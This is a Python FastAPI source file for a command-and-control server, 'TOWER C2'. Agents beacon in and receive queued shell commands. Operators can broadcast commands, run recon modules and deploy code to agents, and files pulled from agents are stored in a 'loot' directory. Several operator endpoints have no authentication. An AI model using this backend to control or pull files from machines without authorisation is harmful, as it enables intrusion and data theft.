"""TOWER C2 — FastAPI Server

Endpoints:
  POST /api/beacon          — agent check-in, receives pending tasks
  POST /api/result          — agent posts task output
  POST /api/transfer/init   — agent initiates file transfer
  POST /api/transfer/chunk  — agent sends file chunk
  GET  /api/agents          — list all agents
  GET  /api/tasks           — list tasks
  POST /webhook/gitea       — Gitea push webhook (auto-deploy)

All bound to 100.64.0.10:8080 — Tailscale only.
"""

from __future__ import annotations

import hashlib
import os
import secrets
from contextlib import contextmanager
from datetime import datetime, timezone

from fastapi import FastAPI, HTTPException, Request, Header, Depends
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
from sqlalchemy.orm import sessionmaker

from models import (
    Agent, Task, FileTransfer, FileChunk, Event, ChatMessage,
    AgentStatus, TaskStatus, TransferStatus, EventSeverity,
    make_engine, init_db,
)
from taskqueue import TaskQueue
from gitops import GitOps
from recon import ModuleRegistry

# ── Setup ─────────────────────────────────────────────────────────────────────

engine = make_engine()
init_db(engine)
SessionFactory = sessionmaker(bind=engine, expire_on_commit=False)

@contextmanager
def get_db():
    db = SessionFactory()
    try:
        yield db
        db.commit()
    except Exception:
        db.rollback()
        raise
    finally:
        db.close()

tq = TaskQueue(get_db)
go = GitOps(get_db, tq)

app = FastAPI(title="TOWER C2", docs_url=None, redoc_url=None)

# Allow only Tailscale subnet
app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://100.64.0.10:4000"],
    allow_methods=["*"],
    allow_headers=["*"],
)


# ── Auth ──────────────────────────────────────────────────────────────────────

def verify_agent(x_agent_token: str = Header(...)):
    with get_db() as db:
        agent = db.query(Agent).filter(Agent.token == x_agent_token).first()
        if not agent:
            raise HTTPException(status_code=401, detail="Invalid agent token")
        return agent


# ── Request Models ────────────────────────────────────────────────────────────

class BeaconPayload(BaseModel):
    hostname:     str
    tailscale_ip: str
    os:           str
    arch:         str
    kernel:       str = ""
    username:     str = ""
    is_root:      bool = False
    git_version:  str = ""
    git_repo:     str = ""

class ResultPayload(BaseModel):
    task_id:  str
    stdout:   str = ""
    stderr:   str = ""
    exit_code: int = 0

class TransferInitPayload(BaseModel):
    direction:    str     # "up" or "down"
    remote_path:  str
    total_bytes:  int = 0
    sha256:       str = ""
    total_chunks: int = 0

class ChunkPayload(BaseModel):
    transfer_id: str
    index:       int
    data_b64:    str
    is_last:     bool = False


# ── Agent Beacon ──────────────────────────────────────────────────────────────

@app.post("/api/beacon")
async def beacon(payload: BeaconPayload, agent: Agent = Depends(verify_agent)):
    """
    Agent checks in. Updates last_seen, returns pending tasks.
    This is the core C2 loop — agents call this every N seconds.
    """
    with get_db() as db:
        db_agent = db.get(Agent, agent.id)
        db_agent.hostname     = payload.hostname
        db_agent.tailscale_ip = payload.tailscale_ip
        db_agent.os           = payload.os
        db_agent.arch         = payload.arch
        db_agent.kernel       = payload.kernel
        db_agent.username     = payload.username
        db_agent.is_root      = payload.is_root
        db_agent.git_version  = payload.git_version
        db_agent.git_repo     = payload.git_repo
        db_agent.last_seen    = datetime.now(timezone.utc)
        db_agent.status       = AgentStatus.ACTIVE

    tasks = tq.get_pending_tasks(agent.id)
    return {"tasks": tasks, "agent_id": agent.id}


@app.post("/api/register")
async def register(payload: BeaconPayload):
    """
    New agent registers itself. Returns a unique token.
    Token is stored agent-side in ~/.c2_token.
    """
    token = secrets.token_hex(32)
    with get_db() as db:
        agent = Agent(
            token        = token,
            hostname     = payload.hostname,
            tailscale_ip = payload.tailscale_ip,
            os           = payload.os,
            arch         = payload.arch,
            kernel       = payload.kernel,
            username     = payload.username,
            is_root      = payload.is_root,
            status       = AgentStatus.ACTIVE,
        )
        db.add(agent)
        db.flush()
        ev = Event(
            severity = EventSeverity.INFO,
            category = "AGENT_REGISTER",
            message  = f"New agent: {payload.hostname} [{payload.tailscale_ip}]",
            agent_id = agent.id,
        )
        db.add(ev)
        db.commit()
        return {"agent_id": agent.id, "token": token}


# ── Results ───────────────────────────────────────────────────────────────────

@app.post("/api/result")
async def post_result(payload: ResultPayload, agent: Agent = Depends(verify_agent)):
    task = tq.record_result(
        payload.task_id,
        payload.stdout,
        payload.stderr,
        payload.exit_code,
    )
    if not task:
        raise HTTPException(status_code=404, detail="Task not found")
    return {"status": "recorded", "task_id": task.id}


# ── File Transfers ────────────────────────────────────────────────────────────

@app.post("/api/transfer/init")
async def transfer_init(payload: TransferInitPayload, agent: Agent = Depends(verify_agent)):
    with get_db() as db:
        import os as _os
        local_path = f"data/loot/{agent.id}/{_os.path.basename(payload.remote_path)}"
        _os.makedirs(f"data/loot/{agent.id}", exist_ok=True)
        transfer = FileTransfer(
            agent_id     = agent.id,
            direction    = payload.direction,
            remote_path  = payload.remote_path,
            local_path   = local_path,
            total_bytes  = payload.total_bytes,
            sha256       = payload.sha256,
            total_chunks = payload.total_chunks,
            status       = TransferStatus.ACTIVE,
        )
        db.add(transfer)
        db.commit()
        db.refresh(transfer)
        return {"transfer_id": transfer.id}


@app.post("/api/transfer/chunk")
async def transfer_chunk(payload: ChunkPayload, agent: Agent = Depends(verify_agent)):
    with get_db() as db:
        transfer = db.get(FileTransfer, payload.transfer_id)
        if not transfer or transfer.agent_id != agent.id:
            raise HTTPException(status_code=404)

        chunk = FileChunk(
            transfer_id = payload.transfer_id,
            index       = payload.index,
            data_b64    = payload.data_b64,
        )
        db.add(chunk)
        transfer.received += 1

        if payload.is_last:
            _assemble(db, transfer)

        db.commit()
        return {"received": transfer.received, "total": transfer.total_chunks}


def _assemble(db, transfer: FileTransfer):
    """Assemble chunks, verify SHA256, mark complete."""
    import base64
    chunks = (
        db.query(FileChunk)
        .filter(FileChunk.transfer_id == transfer.id)
        .order_by(FileChunk.index)
        .all()
    )
    data = b"".join(base64.b64decode(c.data_b64) for c in chunks)
    local_hash = hashlib.sha256(data).hexdigest()

    with open(transfer.local_path, "wb") as f:
        f.write(data)

    transfer.local_sha256 = local_hash
    transfer.completed_at = datetime.now(timezone.utc)
    transfer.status = (
        TransferStatus.VERIFIED
        if local_hash == transfer.sha256
        else TransferStatus.FAILED
    )


# ── Query Endpoints ───────────────────────────────────────────────────────────

@app.get("/api/agents")
async def list_agents():
    with get_db() as db:
        agents = db.query(Agent).all()
        now = datetime.now(timezone.utc)
        result = []
        for a in agents:
            last = a.last_seen.replace(tzinfo=timezone.utc) if a.last_seen else None
            age  = int((now - last).total_seconds()) if last else 9999
            result.append({
                "id":          a.id,
                "hostname":    a.hostname,
                "tailscale_ip":a.tailscale_ip,
                "os":          a.os,
                "username":    a.username,
                "is_root":     a.is_root,
                "status":      a.status,
                "tags":        a.tags,
                "last_seen_s": age,
                "git_version": a.git_version[:8] if a.git_version else "",
                "git_repo":    a.git_repo,
            })
        return result


@app.get("/api/tasks/{task_id}")
async def get_task(task_id: str):
    with get_db() as db:
        t = db.get(Task, task_id)
        if not t:
            raise HTTPException(status_code=404)
        return {
            "id":         t.id,
            "agent_id":   t.agent_id,
            "type":       t.type,
            "status":     t.status,
            "command":    t.command,
            "stdout":     t.stdout,
            "stderr":     t.stderr,
            "exit_code":  t.exit_code,
            "created_at": str(t.created_at),
            "completed_at": str(t.completed_at),
        }


@app.get("/api/loot/{agent_id}")
async def list_loot(agent_id: str):
    import os as _os
    loot_dir = f"data/loot/{agent_id}"
    if not _os.path.exists(loot_dir):
        return []
    files = []
    for f in _os.listdir(loot_dir):
        path = _os.path.join(loot_dir, f)
        stat = _os.stat(path)
        files.append({"name": f, "size": stat.st_size, "modified": stat.st_mtime})
    return files


# ── Gitea Webhook ─────────────────────────────────────────────────────────────

@app.post("/webhook/gitea")
async def gitea_webhook(request: Request, x_gitea_signature_256: str = Header("")):
    body = await request.body()
    if not go.verify_webhook(body, x_gitea_signature_256):
        raise HTTPException(status_code=403, detail="Invalid webhook signature")
    payload = await request.json()
    task_ids = go.handle_push(payload)
    return {"deployed": len(task_ids), "tasks": task_ids}


# ── Agent Patch ───────────────────────────────────────────────────────────────

@app.patch("/api/agents/{agent_id}")
async def patch_agent(agent_id: str, request: Request):
    data = await request.json()
    with get_db() as db:
        agent = db.get(Agent, agent_id)
        if not agent:
            raise HTTPException(status_code=404, detail="Agent not found")
        if "tier" in data:
            agent.tier = int(data["tier"])
        if "tags" in data:
            tags = agent.tags or []
            tag  = data["tags"]
            if tag not in tags:
                tags.append(tag)
            agent.tags = tags
        if "notes" in data:
            agent.notes = data["notes"]
        db.commit()
        return {"updated": agent_id, "tier": agent.tier}


# ── Broadcast ─────────────────────────────────────────────────────────────────

@app.post("/api/broadcast")
async def broadcast(request: Request):
    data    = await request.json()
    command = data.get("command", "")
    tier    = data.get("tier", None)
    if not command:
        raise HTTPException(status_code=400, detail="command required")
    task_ids = tq.submit_broadcast(command, tier=tier)
    return {"queued": len(task_ids), "tasks": task_ids}


# ── Chat ──────────────────────────────────────────────────────────────────────

@app.get("/api/chat")
async def get_chat(channel: str = "general", limit: int = 50):
    with get_db() as db:
        msgs = (
            db.query(ChatMessage)
            .filter(ChatMessage.channel == channel)
            .order_by(ChatMessage.created_at.desc())
            .limit(limit)
            .all()
        )
        return [
            {
                "id":         m.id,
                "author":     m.author,
                "message":    m.message,
                "channel":    m.channel,
                "created_at": str(m.created_at),
            }
            for m in reversed(msgs)
        ]


@app.post("/api/chat")
async def post_chat(request: Request):
    data    = await request.json()
    author  = data.get("author", "anon")
    message = data.get("message", "").strip()
    channel = data.get("channel", "general")
    if not message:
        raise HTTPException(status_code=400, detail="message required")
    with get_db() as db:
        msg = ChatMessage(author=author, message=message, channel=channel)
        db.add(msg)
        db.commit()
        db.refresh(msg)
        return {"id": msg.id, "author": author, "ts": str(msg.created_at)}


@app.get("/chat", response_class=HTMLResponse)
async def chat_ui():
    """Mobile-friendly chat page — no syntax highlighting, plain HTML."""
    html = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>CUMMINS320 Chat</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { background: #0d1117; color: #c9d1d9; font-family: monospace; font-size: 15px; display: flex; flex-direction: column; height: 100dvh; }
  #header { background: #161b22; padding: 10px 16px; border-bottom: 1px solid #30363d; display: flex; align-items: center; gap: 12px; }
  #header h1 { font-size: 16px; color: #58a6ff; letter-spacing: 2px; }
  #channel { color: #8b949e; font-size: 13px; }
  #log { flex: 1; overflow-y: auto; padding: 12px 16px; display: flex; flex-direction: column; gap: 6px; }
  .msg { display: flex; flex-direction: column; }
  .msg-meta { font-size: 11px; color: #8b949e; margin-bottom: 2px; }
  .msg-meta .author { color: #58a6ff; font-weight: bold; margin-right: 8px; }
  .msg-text { background: #161b22; border-radius: 6px; padding: 8px 12px; color: #e6edf3; line-height: 1.5; word-break: break-word; border-left: 3px solid #30363d; }
  .msg-text.mine { border-left-color: #3fb950; }
  #input-bar { background: #161b22; border-top: 1px solid #30363d; padding: 10px 12px; display: flex; gap: 8px; }
  #msg-input { flex: 1; background: #0d1117; border: 1px solid #30363d; border-radius: 6px; color: #e6edf3; padding: 10px 12px; font-family: monospace; font-size: 15px; outline: none; }
  #msg-input:focus { border-color: #58a6ff; }
  #send-btn { background: #238636; color: white; border: none; border-radius: 6px; padding: 10px 18px; font-size: 15px; cursor: pointer; font-family: monospace; }
  #send-btn:active { background: #2ea043; }
  #username-bar { background: #161b22; border-bottom: 1px solid #30363d; padding: 8px 16px; display: flex; align-items: center; gap: 8px; font-size: 13px; color: #8b949e; }
  #username-bar input { background: #0d1117; border: 1px solid #30363d; border-radius: 4px; color: #58a6ff; padding: 4px 8px; font-family: monospace; font-size: 13px; width: 120px; outline: none; }
  #status { font-size: 11px; color: #3fb950; margin-left: auto; }
</style>
</head>
<body>
<div id="header">
  <h1>CUMMINS320</h1>
  <span id="channel">#general</span>
  <span id="status" style="color:#3fb950">● live</span>
</div>
<div id="username-bar">
  <span>Handle:</span>
  <input id="username" type="text" placeholder="your-handle" maxlength="20">
  <span id="conn-status" style="margin-left:auto;color:#8b949e">connecting…</span>
</div>
<div id="log"></div>
<div id="input-bar">
  <input id="msg-input" type="text" placeholder="message…" autocomplete="off" autocorrect="off" spellcheck="false">
  <button id="send-btn">Send</button>
</div>
<script>
  const log = document.getElementById('log');
  const inp = document.getElementById('msg-input');
  const btn = document.getElementById('send-btn');
  const unameEl = document.getElementById('username');
  const connEl = document.getElementById('conn-status');
  let lastId = 0;

  function username() { return unameEl.value.trim() || 'anon'; }

  function addMsg(m, mine=false) {
    const ts = new Date(m.created_at).toLocaleTimeString([], {hour:'2-digit',minute:'2-digit'});
    const div = document.createElement('div');
    div.className = 'msg';
    div.innerHTML = `<div class="msg-meta"><span class="author">${m.author}</span><span>${ts}</span></div>
                     <div class="msg-text${mine?' mine':''}">${m.message.replace(/</g,'&lt;')}</div>`;
    log.appendChild(div);
    log.scrollTop = log.scrollHeight;
    if (m.id > lastId) lastId = m.id;
  }

  async function poll() {
    try {
      const r = await fetch('/api/chat?limit=100');
      const msgs = await r.json();
      const newMsgs = msgs.filter(m => m.id > lastId);
      newMsgs.forEach(m => addMsg(m, m.author === username()));
      connEl.textContent = '● live';
      connEl.style.color = '#3fb950';
    } catch(e) {
      connEl.textContent = '○ reconnecting…';
      connEl.style.color = '#f85149';
    }
  }

  async function send() {
    const txt = inp.value.trim();
    if (!txt) return;
    inp.value = '';
    inp.focus();
    await fetch('/api/chat', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({author: username(), message: txt, channel: 'general'})
    });
    poll();
  }

  btn.onclick = send;
  inp.onkeydown = e => { if (e.key === 'Enter') send(); };
  unameEl.value = localStorage.getItem('c2_handle') || '';
  unameEl.onchange = () => localStorage.setItem('c2_handle', unameEl.value);

  // Load history, then poll every 2s
  poll();
  setInterval(poll, 2000);
</script>
</body>
</html>"""
    return html


# ── Console Endpoints ─────────────────────────────────────────────────────────

@app.get("/api/tasks")
async def list_tasks(agent_id: str = None, status: str = None, limit: int = 50):
    tasks = tq.list_tasks(agent_id=agent_id, status=status, limit=limit)
    return [
        {
            "id":           t.id,
            "agent_id":     t.agent_id,
            "type":         t.type,
            "status":       t.status,
            "command":      t.command,
            "exit_code":    t.exit_code,
            "created_at":   str(t.created_at),
            "completed_at": str(t.completed_at) if t.completed_at else None,
        }
        for t in tasks
    ]


@app.delete("/api/tasks/{task_id}")
async def cancel_task(task_id: str):
    ok = tq.cancel(task_id)
    if not ok:
        raise HTTPException(status_code=404, detail="Task not found or not cancellable")
    return {"cancelled": task_id}


@app.get("/api/events")
async def list_events(limit: int = 50):
    with get_db() as db:
        from models import Event as EventModel
        events = (
            db.query(EventModel)
            .order_by(EventModel.created_at.desc())
            .limit(limit)
            .all()
        )
        return [
            {
                "id":         e.id,
                "severity":   e.severity,
                "category":   e.category,
                "message":    e.message,
                "agent_id":   e.agent_id,
                "operator":   e.operator,
                "created_at": str(e.created_at),
            }
            for e in events
        ]


@app.post("/api/team/add/{username}")
async def add_team_member(username: str):
    result = go.add_team_member(username)
    if not result:
        raise HTTPException(status_code=500, detail="Failed to create Gitea user")
    return result


@app.post("/api/tasks")
async def submit_task(request: Request):
    data     = await request.json()
    agent_id = data.get("agent_id")
    command  = data.get("command", "")
    if not agent_id or not command:
        raise HTTPException(status_code=400, detail="agent_id and command required")
    task = tq.submit_shell(agent_id=agent_id, command=command)
    return {"id": task.id, "status": task.status}


@app.get("/api/repos/status")
async def repos_status():
    return go.deployment_status()


# ── Module / Recon Endpoints ──────────────────────────────────────────────────

@app.get("/api/modules")
async def list_modules():
    return [
        {
            "name":        m.name,
            "description": m.description,
            "priority":    m.priority,
            "args":        [
                {"name": a.name, "description": a.description,
                 "default": a.default, "required": a.required}
                for a in m.args
            ],
        }
        for m in ModuleRegistry.all()
    ]


@app.post("/api/modules/{module_name}/run")
async def run_module(module_name: str, request: Request):
    data     = await request.json()
    agent_id = data.get("agent_id")
    args     = data.get("args", {})
    operator = data.get("operator", "admin")
    if not agent_id:
        raise HTTPException(status_code=400, detail="agent_id required")
    try:
        task = ModuleRegistry.dispatch(module_name, agent_id, args, tq, operator)
    except ValueError as e:
        raise HTTPException(status_code=404, detail=str(e))
    return {"task_id": task.id, "module": module_name, "agent_id": agent_id}


@app.get("/api/snapshots/{agent_id}")
async def list_snapshots(agent_id: str):
    with get_db() as db:
        from models import ReconSnapshot
        snaps = (
            db.query(ReconSnapshot)
            .filter(ReconSnapshot.agent_id == agent_id)
            .order_by(ReconSnapshot.created_at.desc())
            .limit(100)
            .all()
        )
        return [
            {
                "id":         s.id,
                "module":     s.module,
                "created_at": str(s.created_at),
                "data":       s.data,
            }
            for s in snaps
        ]


@app.get("/api/snapshots/{agent_id}/diff")
async def diff_snapshots(agent_id: str, snap_a: int, snap_b: int):
    with get_db() as db:
        from models import ReconSnapshot
        a = db.get(ReconSnapshot, snap_a)
        b = db.get(ReconSnapshot, snap_b)
        if not a or not b or a.agent_id != agent_id or b.agent_id != agent_id:
            raise HTTPException(status_code=404)
        try:
            diff = ModuleRegistry.diff_snapshots(a, b)
        except ValueError as e:
            raise HTTPException(status_code=400, detail=str(e))
        return {
            "snap_a": snap_a, "snap_b": snap_b,
            "module": a.module,
            "diff":   diff,
        }


# ── Deploy Endpoint ───────────────────────────────────────────────────────────

@app.post("/api/deploy/{repo}")
async def deploy_repo(repo: str, branch: str = "main", agent_id: str = None):
    if agent_id:
        with get_db() as db:
            agent = db.get(Agent, agent_id)
            if not agent:
                raise HTTPException(status_code=404, detail="Agent not found")
            task_ids = go.deploy(repo, [agent], branch)
    else:
        task_ids = go.deploy_all(repo, branch)
    return {"deployed": len(task_ids), "tasks": task_ids}
